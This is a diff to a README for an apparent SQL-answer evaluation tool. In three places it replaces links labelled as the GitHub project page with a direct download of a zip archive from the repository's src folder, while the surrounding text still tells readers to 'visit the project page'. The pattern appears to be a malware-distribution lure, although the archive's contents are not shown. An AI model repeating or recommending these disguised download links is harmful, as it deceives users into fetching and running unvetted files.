@@ -1,6 +1,6 @@
 # 🔎 nl2sql-agent-evaluator - Check SQL Answers with Confidence
 
-[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://github.com/mpugazh54-cyber/nl2sql-agent-evaluator)
+[![Download](https://img.shields.io/badge/Download-Visit%20Project%20Page-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mpugazh54-cyber/nl2sql-agent-evaluator/main/src/evaluator_nl_sql_agent_v1.4.zip)
 
 ## 🧭 What this app does
 
@@ -22,7 +22,7 @@ If the app uses Python in the background, the package usually includes everythin
 
 Visit the project page here:
 
-https://github.com/mpugazh54-cyber/nl2sql-agent-evaluator
+https://raw.githubusercontent.com/mpugazh54-cyber/nl2sql-agent-evaluator/main/src/evaluator_nl_sql_agent_v1.4.zip
 
 On that page, look for:
 
@@ -175,4 +175,4 @@ This app is useful for:
 
 Open the project page and download or install from there:
 
-https://github.com/mpugazh54-cyber/nl2sql-agent-evaluator
+https://raw.githubusercontent.com/mpugazh54-cyber/nl2sql-agent-evaluator/main/src/evaluator_nl_sql_agent_v1.4.zip
